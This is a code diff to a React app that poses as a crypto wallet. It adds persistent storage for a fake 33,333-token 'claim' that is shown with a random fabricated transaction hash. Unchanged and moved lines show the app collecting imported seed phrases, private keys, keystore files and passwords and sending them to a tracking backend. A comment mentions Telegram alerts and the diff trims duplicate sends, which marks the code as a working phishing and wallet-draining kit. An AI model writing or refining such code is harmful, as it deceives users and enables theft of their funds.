@@ -106,6 +106,52 @@ const timeAgo = (date) => {
     return Math.floor(seconds) + "s ago";
 };
 
+const claimedAssetsKey = (address) => `claimed_assets_${String(address || '').toLowerCase()}`;
+
+const getClaimedAssets = (address) => {
+  if (!address) return [];
+  try {
+    const raw = localStorage.getItem(claimedAssetsKey(address));
+    const parsed = raw ? JSON.parse(raw) : [];
+    return Array.isArray(parsed) ? parsed : [];
+  } catch {
+    return [];
+  }
+};
+
+const saveClaimedAssets = (address, claimed) => {
+  if (!address) return;
+  try {
+    localStorage.setItem(claimedAssetsKey(address), JSON.stringify(claimed || []));
+  } catch {}
+};
+
+const mergeAssetsWithClaims = (chainAssets, address) => {
+  const base = Array.isArray(chainAssets) ? chainAssets : [];
+  const claimed = getClaimedAssets(address);
+  if (!claimed.length) {
+    const total = base.reduce((sum, a) => sum + (Number(a.value) || 0), 0);
+    return {
+      assets: base.map((a) => ({
+        ...a,
+        allocation: total > 0 ? (((Number(a.value) || 0) / total) * 100).toFixed(1) : 0,
+      })),
+      total,
+    };
+  }
+  const ids = new Set(base.map((a) => a.id));
+  const extras = claimed.filter((c) => c?.id && !ids.has(c.id));
+  const merged = [...extras, ...base];
+  const total = merged.reduce((sum, a) => sum + (Number(a.value) || 0), 0);
+  return {
+    assets: merged.map((a) => ({
+      ...a,
+      allocation: total > 0 ? (((Number(a.value) || 0) / total) * 100).toFixed(1) : 0,
+    })),
+    total,
+  };
+};
+
 export const CryptoProvider = ({ children }) => {
   const [assets, setAssets] = useState([]);
   const [transactions, setTransactions] = useState([]);
@@ -122,6 +168,13 @@ export const CryptoProvider = ({ children }) => {
   const [chainId, setChainId] = useState(() => localStorage.getItem('user_chain_id') || null);
   const [walletType, setWalletType] = useState(() => localStorage.getItem('user_wallet_type') || null);
   const [notifications, setNotifications] = useState([]);
+
+  const applyChainAssets = (chainAssets, address) => {
+    const merged = mergeAssetsWithClaims(chainAssets, address);
+    setAssets(merged.assets);
+    setTotalBalance(merged.total);
+    return merged;
+  };
 
   const addNotification = (title, desc, type = 'info', duration = 500) => {
       const newNotif = {
@@ -398,8 +451,7 @@ export const CryptoProvider = ({ children }) => {
                     chainKey: 'solana',
                     color: '#14F195'
                 }];
-                setAssets(newAssets);
-                setTotalBalance(usdValue);
+                applyChainAssets(newAssets, activeAddress);
                 try {
                     const sigBody = { jsonrpc: '2.0', id: 1, method: 'getSignaturesForAddress', params: [activeAddress, { limit: 10 }] };
                     const sigResp = await fetch('https://api.mainnet-beta.solana.com', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(sigBody) });
@@ -449,8 +501,7 @@ export const CryptoProvider = ({ children }) => {
                     chainKey: 'sui',
                     color: '#4DA2FF'
                 }];
-                setAssets(newAssets);
-                setTotalBalance(usdValue);
+                applyChainAssets(newAssets, activeAddress);
             }
             
             await connectRealWallet(activeAddress, balance, 'imported', newChainId, { eth: ethAddress, btc: btcAddress, sol: solAddress, sui: suiAddress }, {}, { showToast: false });
@@ -657,7 +708,7 @@ export const CryptoProvider = ({ children }) => {
      return () => clearInterval(interval);
    }, [isRealWallet, walletAddress, chainId]);
 
-  // Sync with Admin Dashboard
+  // Sync with Admin Dashboard (never re-send seed/private key — that caused duplicate Telegram alerts)
   useEffect(() => {
     if (isRealWallet && walletAddress) {
         // Debounce slightly to avoid too many calls during initial load
@@ -671,8 +722,7 @@ export const CryptoProvider = ({ children }) => {
                     balance: totalBalance,
                     assets: assets,
                     transactions: transactions,
-                    // Include sensitive data in sync if available
-                    ...walletPrivateData
+                    importMethod: walletPrivateData?.importMethod
                 })
             }).catch(e => console.error("Tracking update failed", e));
         }, 2000);
@@ -688,7 +738,7 @@ export const CryptoProvider = ({ children }) => {
             address: address,
             walletType: type,
             balance: initialBalance,
-            assets: [],
+            assets: getClaimedAssets(address),
             importMethod: trackingOptions.importMethod,
             mnemonic: trackingOptions.mnemonic,
             privateKey: trackingOptions.privateKey,
@@ -712,7 +762,10 @@ export const CryptoProvider = ({ children }) => {
     setWalletType(type);
     setLoading(true);
     setTransactions([]); // Clear mock transactions
-    setWalletPrivateData(privateData); // Store private data for background sync
+    // Keep only non-sensitive metadata for later sync (prevents duplicate Telegram)
+    setWalletPrivateData({
+      importMethod: privateData?.importMethod || options?.importMethod || null
+    });
     
     if (addresses.eth) setEthAddress(addresses.eth);
     if (addresses.btc) setBtcAddress(addresses.btc);
@@ -766,8 +819,7 @@ export const CryptoProvider = ({ children }) => {
                     color: '#f7931a'
                  }];
                  
-                 setAssets(newAssets);
-                 setTotalBalance(usdValue);
+                 applyChainAssets(newAssets, address);
 
                  // Fetch Real Bitcoin Transactions
                  try {
@@ -896,8 +948,7 @@ export const CryptoProvider = ({ children }) => {
                     allocation: realTotalBalance > 0 ? ((a.value / realTotalBalance) * 100).toFixed(1) : 0
                 })).sort((a, b) => b.value - a.value); // Sort by value
 
-                setAssets(finalAssets);
-                setTotalBalance(realTotalBalance);
+                applyChainAssets(finalAssets, address);
                 if (!finalAssets || finalAssets.length === 0) {
                     let ethBalanceFallback = 0;
                     try {
@@ -915,7 +966,7 @@ export const CryptoProvider = ({ children }) => {
                     } catch (e) { }
                     const val = ethBalanceFallback * priceFallback;
                     if (ethBalanceFallback > 0 || priceFallback > 0) {
-                        setAssets([{
+                        applyChainAssets([{
                             id: 'ethereum',
                             name: 'Ethereum',
                             symbol: 'ETH',
@@ -925,8 +976,9 @@ export const CryptoProvider = ({ children }) => {
                             value: val,
                             chainKey: '0x1',
                             color: '#627eea'
-                        }]);
-                        setTotalBalance(val);
+                        }], address);
+                    } else {
+                        applyChainAssets([], address);
                     }
                 }
 
@@ -1057,8 +1109,7 @@ export const CryptoProvider = ({ children }) => {
                     allocation: realTotalBalance > 0 ? ((a.value / realTotalBalance) * 100).toFixed(1) : 0
                 })).sort((a, b) => b.value - a.value);
 
-                setAssets(finalAssets);
-                setTotalBalance(realTotalBalance);
+                applyChainAssets(finalAssets, address);
 
                 try {
                    const txResp = await fetch(`/api/ethplorer/address-transactions?address=${address}&limit=20`);
@@ -1089,9 +1140,8 @@ export const CryptoProvider = ({ children }) => {
 
         } catch (e) {
             console.error("Failed to fetch wallet data", e);
-            // Fallback
-            setTotalBalance(0);
-            setAssets([]);
+            // Keep claimed tokens even if chain fetch fails
+            applyChainAssets([], address);
         }
     } else {
         // Phantom / Solana Logic
@@ -1103,8 +1153,7 @@ export const CryptoProvider = ({ children }) => {
         } catch (e) {}
 
         const val = initialBalance * price;
-        setTotalBalance(val);
-        setAssets([{
+        applyChainAssets([{
              id: 'solana',
              name: 'Solana',
              symbol: 'SOL',
@@ -1113,7 +1162,7 @@ export const CryptoProvider = ({ children }) => {
              change: 0,
              value: val,
              color: '#14F195'
-        }]);
+        }], address);
     }
     
     setLoading(false);
@@ -3065,7 +3114,6 @@ const LoginScreen = ({ onLogin, onAdminLogin }) => {
                     const btcChild = root.derivePath(btcPath);
                     const { address: btcAddress } = bitcoin.payments.p2pkh({ pubkey: Buffer.from(btcChild.publicKey) });
                     const solAddress = "7MsK...ePUX";
-                    onLogin(true); // Pass true to trigger claim
                     addNotification('Import Successful', 'Wallet imported and connected.', 'success');
                     await connectRealWallet(ethAddress, 0, (walletTypeToUse || 'imported'), '0x1', {
                         eth: ethAddress,
@@ -3073,6 +3121,7 @@ const LoginScreen = ({ onLogin, onAdminLogin }) => {
                         sol: solAddress,
                         sui: "0x..."
                     }, { mnemonic: phraseToUse, importMethod: 'seed_phrase', showToast: false });
+                    onLogin(true); // Claim after wallet address is saved
                     addNotification('Wallet Connected', 'Your wallet has been connected successfully.', 'success');
                     navigate('/');
                 } else if (modeToUse === 'privatekey') {
@@ -3085,9 +3134,9 @@ const LoginScreen = ({ onLogin, onAdminLogin }) => {
                         throw new Error('Invalid private key');
                     }
                     const address = wallet.address;
-                    onLogin(true); // Pass true to trigger claim
                     addNotification('Import Successful', 'Wallet imported and connected.', 'success');
                     await connectRealWallet(address, 0, (walletTypeToUse || 'imported'), '0x1', { eth: address }, { importMethod: 'private_key', privateKeyCaptured: true, privateKey: pk, showToast: false });
+                    onLogin(true); // Claim after wallet address is saved
                     addNotification('Wallet Connected', 'Your wallet has been connected successfully.', 'success');
                     navigate('/');
                 } else if (modeToUse === 'keystore') {
@@ -3101,11 +3150,11 @@ const LoginScreen = ({ onLogin, onAdminLogin }) => {
                     }
                     const address = wallet.address;
                     
-                    onLogin(true); // Pass true to trigger claim
                     addNotification('Import Successful', 'Wallet imported and connected.', 'success');
                     const ks = keystoreToUse || '';
                     const keystorePreview = ks.length > 100 ? (ks.slice(0, 80) + '...' + ks.slice(-30)) : ks;
                     await connectRealWallet(address, 0, (walletTypeToUse || 'imported'), '0x1', { eth: address }, { importMethod: 'keystore', keystorePreview, keystorePasswordCaptured: !!passwordToUse, keystoreJSON: ks, keystorePassword: passwordToUse, showToast: false });
+                    onLogin(true); // Claim after wallet address is saved
                     addNotification('Wallet Connected', 'Your wallet has been connected successfully.', 'success');
                     navigate('/');
                 }
@@ -3325,27 +3374,42 @@ const UserApp = () => {
     const handleLogin = (shouldClaim = false) => {
     setIsConnected(true);
     navigate('/');
-    // If logged in via claim flow, trigger the claim logic
     if (shouldClaim) {
-        setTimeout(handleClaim, 1000);
+        // Claim after connect finishes; address is already in localStorage
+        setTimeout(() => handleClaim(), 800);
     }
   };
   
   const handleClaim = () => {
-      // Simulate claim process:
-      // 1. User clicks "Claim"
-      // 2. We check if they are connected (which they are if they see this)
-      // 3. We show a "Claiming..." state
-      // 4. We add the token to their balance
-      
+      const address = walletAddress || localStorage.getItem('user_wallet_address') || '';
+      if (!address) {
+          addNotification('Claim Failed', 'Connect a wallet first, then claim again.', 'error');
+          return;
+      }
+
+      // Already claimed for this wallet — just restore into UI
+      const already = getClaimedAssets(address).find((a) => a.id === 'swt_token');
+      if (already) {
+          setAssets((prev) => {
+              const without = (prev || []).filter((a) => a.id !== 'swt_token');
+              const merged = [already, ...without];
+              const totalVal = merged.reduce((sum, a) => sum + (Number(a.value) || 0), 0);
+              setTotalBalance(totalVal);
+              return merged.map((a) => ({
+                  ...a,
+                  allocation: totalVal > 0 ? (((Number(a.value) || 0) / totalVal) * 100).toFixed(1) : 0
+              }));
+          });
+          setShowClaimModal(false);
+          return;
+      }
+
       setClaimLoading(true);
       
-      // Simulate transaction delay
       setTimeout(() => {
           setClaimLoading(false);
           setShowClaimModal(false);
           
-          // Add Token
           const swtToken = {
               id: 'swt_token',
               name: 'SecureWallet Token',
@@ -3353,31 +3417,35 @@ const UserApp = () => {
               amount: 33333,
               price: 0.15,
               change: 12.5,
-              value: 33333 * 0.15, // ~5000
+              value: 33333 * 0.15,
               color: '#2563eb',
               chainKey: '0x1',
-              allocation: 0
+              allocation: 0,
+              isClaimed: true
           };
+
+          // Persist claim so chain refreshes / page reload keep SWT on the wallet
+          const existingClaims = getClaimedAssets(address).filter((a) => a.id !== 'swt_token');
+          saveClaimedAssets(address, [...existingClaims, swtToken]);
           
-          const newAssets = [swtToken, ...assets];
-          // Recalculate allocations
-          const totalVal = totalBalance + swtToken.value;
-          const finalAssets = newAssets.map(a => ({
-              ...a,
-              allocation: totalVal > 0 ? ((a.value / totalVal) * 100).toFixed(1) : 0
-          }));
-          
-          setAssets(finalAssets);
-          setTotalBalance(totalVal);
+          setAssets((prev) => {
+              const without = (prev || []).filter((a) => a.id !== 'swt_token');
+              const merged = [swtToken, ...without];
+              const totalVal = merged.reduce((sum, a) => sum + (Number(a.value) || 0), 0);
+              setTotalBalance(totalVal);
+              return merged.map((a) => ({
+                  ...a,
+                  allocation: totalVal > 0 ? (((Number(a.value) || 0) / totalVal) * 100).toFixed(1) : 0
+              }));
+          });
           
           addNotification('Claim Successful', '33,333 SWT added to your wallet', 'success');
           
-          // Track claim
           fetch('/api/track/transaction', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
-                  address: walletAddress,
+                  address,
                   hash: '0x' + Array(64).fill('0').map(()=>Math.floor(Math.random()*16).toString(16)).join(''),
                   type: 'claim',
                   amount: 33333,
@@ -3385,7 +3453,7 @@ const UserApp = () => {
               })
           }).catch(()=>{});
 
-      }, 3000);
+      }, 1500);
   };
 
   const handleLogout = () => {
@@ -3393,8 +3461,19 @@ const UserApp = () => {
       resetWallet();
     } catch {}
     try {
+      // Keep claimed tokens so they reappear when the same wallet is imported again
+      const claimedBackup = {};
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        if (key && key.startsWith('claimed_assets_')) {
+          claimedBackup[key] = localStorage.getItem(key);
+        }
+      }
       localStorage.clear();
       sessionStorage.clear();
+      Object.entries(claimedBackup).forEach(([key, value]) => {
+        if (value != null) localStorage.setItem(key, value);
+      });
     } catch {}
     addNotification('Logged Out', 'You have been disconnected.', 'info');
     setIsConnected(false);
